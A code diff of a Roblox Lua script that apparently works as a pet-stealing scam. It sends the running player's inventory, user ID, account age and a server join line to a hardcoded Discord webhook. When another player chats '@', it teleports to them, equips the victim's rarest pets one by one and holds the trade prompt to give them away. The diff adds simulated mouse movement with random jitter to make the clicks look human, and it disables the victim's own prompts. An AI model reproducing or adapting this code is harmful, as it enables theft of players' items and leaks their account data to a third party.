@@ -5,36 +5,39 @@ local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 local TeleportService = game:GetService("TeleportService")
 local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
+-- Webhook configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
-local RARE_PETS = {
-    "T-Rex", "Dragonfly", "Raccoon", 
-    "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"
-}
+local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 
+-- Item priority system
 local ITEM_PRIORITY = {
-    ["T-Rex"] = 1000,
-    ["Dragonfly"] = 950,
-    ["Queen bee"] = 900,
-    ["Disco bee"] = 850,
-    ["Raccoon"] = 800,
-    ["Mimic Octopus"] = 750,
-    ["Butterfly"] = 700,
-    ["Disco"] = 600,
-    ["Wet"] = 500,
+    ["T-Rex"] = 1000, ["Dragonfly"] = 950, ["Queen bee"] = 900,
+    ["Disco bee"] = 850, ["Raccoon"] = 800, ["Mimic Octopus"] = 750,
+    ["Butterfly"] = 700, ["Disco"] = 600, ["Wet"] = 500
 }
 
-local function sendToDiscord(content, embed)
+-- Alternative webhook method using request library
+local function sendWebhook(content, embed)
     local payload = {
         content = content,
         embeds = {embed}
     }
-    local success, err = pcall(function()
-        local json = HttpService:JSONEncode(payload)
-        HttpService:PostAsync(WEBHOOK_URL, json)
+    
+    local success, response = pcall(function()
+        return syn.request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
     end)
+    
     if not success then
-        warn("Webhook failed: "..err)
+        warn("Webhook failed: "..tostring(response))
     end
 end
 
@@ -43,121 +46,139 @@ local function sendInitialWebhook()
     local jobId = game.JobId
     local items = {}
     
-    for _,item in pairs(LocalPlayer.Backpack:GetChildren()) do
+    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
         table.insert(items, item.Name)
     end
     
     local rareItems = {}
-    for _,pet in pairs(RARE_PETS) do
+    for _, pet in pairs(RARE_PETS) do
         if table.find(items, pet) then
             table.insert(rareItems, pet)
         end
     end
     
     local embed = {
-        title = "🔍 Inventory Scan | "..LocalPlayer.Name,
-        description = "**Items:** "..#items.."\n**Rare Items:** "..#rareItems,
+        title = "📦 Inventory Scan | "..LocalPlayer.Name,
+        description = "**Total Items:** "..#items.."\n**Rare Items:** "..#rareItems,
         color = #rareItems > 0 and 0xFF0000 or 0x00FF00,
         thumbnail = {
             url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
         },
         fields = {
-            {name = "📌 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
+            {name = "🔗 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
             {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
             {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
-            {name = "🌟 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
+            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
         },
         footer = {
             text = "Scan Time: "..os.date("%X")
         }
     }
     
-    sendToDiscord(#rareItems > 0 and "@everyone" or nil, embed)
+    sendWebhook(#rareItems > 0 and "@everyone" or nil, embed)
 end
 
 local function getBestItem(target)
     local bestItem, bestPriority = nil, 0
-    
-    for _,item in pairs(target.Backpack:GetChildren()) do
-        local itemName = item.Name
+    for _, item in pairs(target.Backpack:GetChildren()) do
         local priority = 400
-        
-        for pet, petPriority in pairs(ITEM_PRIORITY) do
-            if string.find(itemName, pet) then
-                priority = petPriority
+        for pattern, value in pairs(ITEM_PRIORITY) do
+            if string.find(item.Name, pattern) then
+                priority = value
                 break
             end
         end
-        
-        local rarity = string.match(itemName, "%[([%w%s]+)%]")
-        if rarity and ITEM_PRIORITY[rarity] then
-            priority = ITEM_PRIORITY[rarity]
-        end
-        
         if priority > bestPriority then
             bestPriority = priority
             bestItem = item
         end
     end
-    
     return bestItem
 end
 
 local function findBestPrompt(targetChar)
-    local bestPrompt, highestHoldDuration = nil, 0
-    
-    for _,part in pairs(targetChar:GetDescendants()) do
-        if part:IsA("ProximityPrompt") then
-            if part.HoldDuration > highestHoldDuration then
-                highestHoldDuration = part.HoldDuration
-                bestPrompt = part
-            end
+    local bestPrompt, maxHold = nil, 0
+    for _, part in pairs(targetChar:GetDescendants()) do
+        if part:IsA("ProximityPrompt") and part.HoldDuration > maxHold then
+            maxHold = part.HoldDuration
+            bestPrompt = part
         end
     end
-    
-    return bestPrompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
+    return bestPrompt
 end
 
-local function teleportToPlayer(target)
-    local targetChar = target.Character or target.CharacterAdded:Wait()
-    local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-        LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+local function simulateHumanClick(position, duration)
+    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
+    local originalPos = Vector2.new(mouse.X, mouse.Y)
+    
+    -- Move mouse to target position gradually
+    local steps = 10
+    for i = 1, steps do
+        local t = i/steps
+        local newPos = originalPos:Lerp(position, t)
+        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
+        task.wait(0.05)
     end
+    
+    -- Press and hold
+    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, true, game, 1)
+    local startTime = os.clock()
+    
+    -- Small random movements during hold
+    while os.clock() - startTime < duration do
+        local jitter = Vector2.new(math.random(-5,5), math.random(-5,5))
+        VirtualInputManager:SendMouseMoveEvent(position.X + jitter.X, position.Y + jitter.Y, game)
+        task.wait(0.1)
+    end
+    
+    -- Release
+    VirtualInputManager:SendMouseButtonEvent(position.X, position.Y, 0, false, game, 1)
 end
 
 local function interactWithTarget(target)
-    teleportToPlayer(target)
     local targetChar = target.Character or target.CharacterAdded:Wait()
-    local interactPart = findBestPrompt(targetChar)
+    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
     
+    -- Teleport to player
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+    
+    -- Set up camera
     LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
     LocalPlayer.CameraMaxZoomDistance = 0.5
     LocalPlayer.CameraMinZoomDistance = 0.5
     
+    -- Find interaction point
+    local prompt = findBestPrompt(targetChar)
+    local interactPart = prompt or targetChar:FindFirstChild("HumanoidRootPart") or targetChar:FindFirstChild("UpperTorso")
+    
+    -- Look at target
     local lookConn = RunService.Heartbeat:Connect(function()
         Camera.CFrame = CFrame.new(Camera.CFrame.Position, interactPart.Position)
     end)
     
+    -- Process items
     while true do
         local bestItem = getBestItem(LocalPlayer)
         if not bestItem then break end
         
+        -- Equip item
         LocalPlayer.Character.Humanoid:EquipTool(bestItem)
         task.wait(0.5)
         
-        if interactPart:IsA("ProximityPrompt") then
-            local startTime = os.clock()
-            while os.clock() - startTime < 5 do
-                if not interactPart.Enabled then break end
-                fireproximityprompt(interactPart)
-                task.wait(0.1)
+        if prompt then
+            -- Get screen position of prompt
+            local screenPos, visible = Camera:WorldToScreenPoint(prompt.Parent.Position)
+            if visible then
+                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
             end
         else
-            mouse1press()
-            task.wait(5)
-            mouse1release()
+            -- Fallback click
+            local torsoPos = targetChar:FindFirstChild("UpperTorso").Position
+            local screenPos, visible = Camera:WorldToScreenPoint(torsoPos)
+            if visible then
+                simulateHumanClick(Vector2.new(screenPos.X, screenPos.Y), 5)
+            end
         end
     end
     
@@ -165,64 +186,61 @@ local function interactWithTarget(target)
 end
 
 local function onPlayerChatted(player, message)
-    if player == LocalPlayer then return end
-    if not string.find(message, "@") then return end
+    if player == LocalPlayer or not string.find(message, "@") then return end
     
+    -- Send webhook
     local items = {}
-    for _,item in pairs(player.Backpack:GetChildren()) do
+    for _, item in pairs(player.Backpack:GetChildren()) do
         table.insert(items, item.Name)
     end
     
     local rareItems = {}
-    for _,pet in pairs(RARE_PETS) do
+    for _, pet in pairs(RARE_PETS) do
         if table.find(items, pet) then
             table.insert(rareItems, pet)
         end
     end
     
     local embed = {
-        title = "🎯 Target Triggered | "..player.Name,
-        description = "**Mentioned in chat**",
+        title = "🎯 Target Mentioned | "..player.Name,
+        description = "**Chat:** ```"..message.."```",
         color = 0xFFA500,
         thumbnail = {
             url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
         },
         fields = {
-            {name = "🆔 User ID", value = "```"..player.UserId.."```", inline = true},
-            {name = "📅 Account Age", value = "```"..player.AccountAge.." days```", inline = true},
-            {name = "📦 Total Items", value = "```"..#items.."```", inline = true},
-            {name = "🌟 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
+            {name = "📦 Items", value = "```"..#items.." found```", inline = true},
+            {name = "💎 Rares", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
+            {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
         },
         footer = {
-            text = "Trigger Time: "..os.date("%X")
+            text = "Triggered: "..os.date("%X")
         }
     }
     
-    sendToDiscord(nil, embed)
+    sendWebhook(nil, embed)
     interactWithTarget(player)
 end
 
+-- Initialize
 sendInitialWebhook()
 
-for _,player in pairs(Players:GetPlayers()) do
+-- Set up chat listeners
+for _, player in pairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
-        player.Chatted:Connect(function(msg)
-            onPlayerChatted(player, msg)
-        end)
+        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
     end
 end
 
 Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg)
-        onPlayerChatted(player, msg)
-    end)
+    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
 end)
 
+-- Disable local prompts
 local function disableLocalPrompts()
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local rootPart = character:WaitForChild("HumanoidRootPart")
-    
-    for _,child in pairs(rootPart:GetChildren()) do
+    for _, child in pairs(rootPart:GetChildren()) do
         if child:IsA("ProximityPrompt") then
             child.Enabled = false
         end
